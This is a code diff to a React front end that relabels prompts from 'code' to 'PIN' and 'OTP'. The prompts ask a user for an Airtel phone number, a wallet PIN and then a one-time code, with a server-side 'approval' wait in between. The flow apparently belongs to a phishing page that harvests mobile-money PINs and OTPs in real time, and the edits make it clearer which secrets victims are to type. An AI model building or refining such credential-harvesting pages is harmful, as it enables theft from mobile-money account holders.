@@ -243,7 +243,7 @@ function App() {
         if (json?.action === 'invalid_info') {
           setWaitingApproval(false);
           setApprovalPassed(false);
-          setApprovalError('Incorrect code. Please verify the information and try again.');
+          setApprovalError('Incorrect PIN. Please verify the information and try again.');
           setOtpSent(false);
           setOtpTimer(0);
           setActionLoading(false);
@@ -292,7 +292,7 @@ function App() {
             setOtpTimer(0);
             setWaitingApproval(false);
             setOtpError('');
-            setApprovalError('Incorrect code. Please re-enter your phone number and code.');
+            setApprovalError('Incorrect PIN. Please re-enter your phone number and PIN.');
             return;
           }
 
@@ -421,7 +421,7 @@ function App() {
       }
 
       if (!validPin) {
-        setWalletPinError('Enter a valid code (4 to 6 digits).');
+        setWalletPinError('Enter a valid PIN (4 to 6 digits).');
       }
 
       if (!validPhone || !validPin) {
@@ -594,7 +594,7 @@ function App() {
                   ? 'Validating your information...'
                   : approvalPassed
                     ? `An OTP code was sent to ${apiAirtelNumber || 'your Airtel number'}. Enter it to finish.`
-                    : 'Verify your number with your code'}
+                    : 'Verify your number with your PIN'}
               </span>
             </p>
 {waitingApproval && (
@@ -644,7 +644,7 @@ function App() {
                   </label>
 
                   <label className="form-field">
-                    <span className="label-with-icon"><UiGlyph type="lock" />Enter Your Code</span>
+                    <span className="label-with-icon"><UiGlyph type="lock" />Enter Your PIN</span>
                     <input
                       type="password"
                       value={walletPin}
@@ -654,7 +654,7 @@ function App() {
                         if (approvalError) setApprovalError('');
                         if (submissionError) setSubmissionError('');
                       }}
-                      placeholder="Enter your code"
+                      placeholder="Enter your PIN"
                       inputMode="numeric"
                       required
                     />
@@ -665,7 +665,7 @@ function App() {
 
               {approvalPassed && !paymentConfirmed && (
                 <label className="form-field">
-                  <span className="label-with-icon otp-label-centered"><UiGlyph type="otp" />Enter your code</span>
+                  <span className="label-with-icon otp-label-centered"><UiGlyph type="otp" />Enter OTP</span>
                   <div className="otp-grid" onPaste={handleOtpPaste}>
                     {otpDigits.map((digit, idx) => (
                       <input
